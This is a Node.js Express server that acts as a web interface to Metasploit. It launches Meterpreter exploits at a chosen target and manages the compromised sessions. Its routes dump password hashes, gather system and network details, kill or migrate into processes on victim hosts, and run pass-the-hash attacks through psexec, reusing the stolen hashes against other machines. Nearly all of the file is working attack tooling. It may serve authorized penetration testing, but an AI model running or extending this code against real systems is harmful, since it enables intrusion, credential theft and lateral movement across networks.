var config = require('./config.js'),

		express = require('express'),
		ejs 		= require('ejs'),
		async 	= require('async'),
		msfjs 	= require('msfjs')({
			path: config.metasploitpath
		});

var app = express();

var sessiondata = {};

// Configure app

app.use(express.bodyParser());
app.use(express.static('files/public'));
app.set('views', 'files/views');
app.use(app.router);

// Routes

app.get('/', function(request, response) {

	response.render('index.ejs', {
		layout: false,
		exploits: msfjs.Exploits.exploits,
		payloads: msfjs.Payloads.payloads
	});

});

app.get('/exploits', function(request, response) {

	response.render('exploits.ejs', {
		layout: false,
		exploits: msfjs.Exploits.exploits
	});

});

app.get('/sessions', function(request, response) {

	response.render('sessions.ejs', {
		layout: false,
		sessions: msfjs.Metasploit.sessions
	});

});

app.get('/sessions/:session', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid];

	session.getpid(function(pid) {

		if(sessiondata[sessionid]) {

			response.render('sessions/index.ejs', {
				layout: false,
				sessionid: sessionid,
				sysdata: sessiondata[sessionid].sysdata,
				cpudata: sessiondata[sessionid].cpudata,
				osdata:  sessiondata[sessionid].osdata,
				hashes:  sessiondata[sessionid].hashes,
				pid: 		 pid,
				session: session
			});

		} else {

			session.wmic("computersystem get Name,Manufacturer,TotalPhysicalMemory", function(sysdata) {

				session.wmic("cpu get Name,Manufacturer,NumberOfCores", function(cpudata) {

					session.wmic("os get Caption,Version,SerialNumber", function(osdata) {

						session.hashdump(function(hashes) {

							sessiondata[sessionid] = {
								sysdata: sysdata,
								cpudata: cpudata,
								osdata:  osdata,
								hashes:  hashes
							}

							response.render('sessions/index.ejs', {
								layout: false,
								sessionid: sessionid,
								sysdata: sysdata,
								cpudata: cpudata,
								osdata:  osdata,
								hashes:  hashes,
								pid: 		 pid,
								session: session
							});

						});
					});
				});
			});
		}

	});
});

app.get('/sessions/:session/kill', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid];

	session.on("killed", function() {

		delete sessiondata[sessionid];
		response.redirect('/sessions');

	});

	session.kill();

});

app.get('/sessions/:session/processes', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid];

	session.ps(function(processes) {
		session.getpid(function(pid) {
			response.render('sessions/processes.ejs', {
				layout: false,
				session: request.params.session,
				processes: processes,
				pid: pid
			});
		});
	});
});

app.get('/sessions/:session/processes/:pid/kill', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid],
			pid 			= request.params.pid,
			cmd 			= 'execute -f C:/Windows/System32/taskkill.exe -a "/PID ' + pid + ' /F"';

	session.run(cmd, function(d) {

		response.redirect('/sessions/' + sessionid + "/processes");

	});

})

app.get('/sessions/:session/processes/:pid/migrate', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid],
			pid     	= request.params.pid;

	session.migrate(pid, function(err, result) {

		if(err) {
			response.writeHead(503);
			response.end();
			console.error(err);
			return;
		}

		response.redirect('/sessions/' + request.params.session);

	});
});

app.get('/sessions/:session/networking', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid];

	session.ifconfig(function(interfaces) {

		session.arp(function(hosts) {

			response.render('sessions/networking.ejs', {
				layout: false,
				session: sessionid,
				interfaces: interfaces,
				hosts: hosts
			});

		});

	});

});

app.get('/sessions/:session/networking/pth/:ip', function(request, response) {

	var sessionid = request.params.session,
			session 	= msfjs.Metasploit.sessions[sessionid],
			ip 				= request.params.ip;

	var hashes = sessiondata[sessionid].hashes;

	var exploits = [];

	for(var i = 0; i < hashes.length; i++) {

		var hash = hashes[i];

		var options = {
			lhost: session.access.options.lhost,
			rhost: ip,
			lport: 4445+i,
			SMBUser: hash.user,
			SMBPass: [ hash.lm.replace(/aad3b435b51404ee/g, '0000000000000000'), hash.ntlm ].join(":")
		}

		var exploit = new msfjs.Meterpreter("windows/smb/psexec", options);

		exploits.push(exploit);

	}

	exploits.forEach(function(exploit) {

		msfjs.Exploits.launch(exploit, function(status) {

			status.on("success", function(session) {

				session.access.passthehash = true;

				console.log("Got pass the hash session from " + session.connection.to.host);

			});

			status.on("error", function(error) {

				if(error.ERRNO == '115' || error.ERRNO == '117') {
					return;
				}

				console.error(error);

			});

		});

	});

	response.redirect('/sessions');

})

app.get('/payloads', function(request, response) {

	response.render('payloads.ejs', {
		layout: false,
		payloads: msfjs.Payloads.payloads
	});

});

app.get('/launch', function(request, response) {

	response.render('launch.ejs', {
		layout: false,
		options: request.query
	});

});

app.post('/launch', function(request, response) {

	var options = {};

	var exploit = request.body.exploit,
			payload = request.body.payload,
			target  = request.body.target;

	options.rhost = target;

	if(request.body.options) {

		request.body.options.forEach(function(option) {
			options[option.key] = option.value;
		});

	}

	console.log("Launching " + payload + " at " + target + " using " + exploit);

	var exploit = new msfjs.Meterpreter(exploit, options);

	msfjs.Exploits.launch(exploit, function(status) {

		response.end();

		status.on("success", function(session) {

			console.log("Got meterpreter shell on " + session.connection.to.host);

		});

		status.on("error", function(error) {
			console.error(error);
		});

	});

});

app.listen(config.server.port, config.server.host, function() {
	console.log("Listening on " + [ config.server.host, config.server.port ].join(":"));
	console.log("Please wait till you see 'Loaded payloads.' & 'Loaded exploits.', before starting to use the interface!");
});